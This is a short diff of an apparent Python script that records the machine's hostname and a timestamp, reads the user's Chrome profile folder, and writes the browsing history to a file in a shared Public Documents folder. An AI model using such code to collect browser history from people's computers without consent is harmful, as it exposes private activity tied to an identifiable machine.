@@ -73,7 +73,15 @@ def getMac() :
     return nics
 
 # f1 = open('E:\chrome_url_info.txt', 'w+', encoding='utf8')
-f2 = open('E:\chrome_history_info.txt', 'w+', encoding='utf8')
+time = datetime.datetime.now()
+curr_time = ("%s%s%s" % (time.year, time.month, time.day)) + '_' + time.strftime("%H%M%S")
+print(curr_time)
+
+computer_N = socket.gethostname()
+print(computer_N)
+
+f2 = open("C:\\Users\\Public\\Documents\\" + computer_N + '_'+ curr_time + '_ChromeHistory'+'.txt', 'w+', encoding='utf8')
+# f2 = open('E:\chrome_history_info.txt', 'w+', encoding='utf8')
 
 data_path = os.path.expanduser('~') + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
 files = os.listdir(data_path)
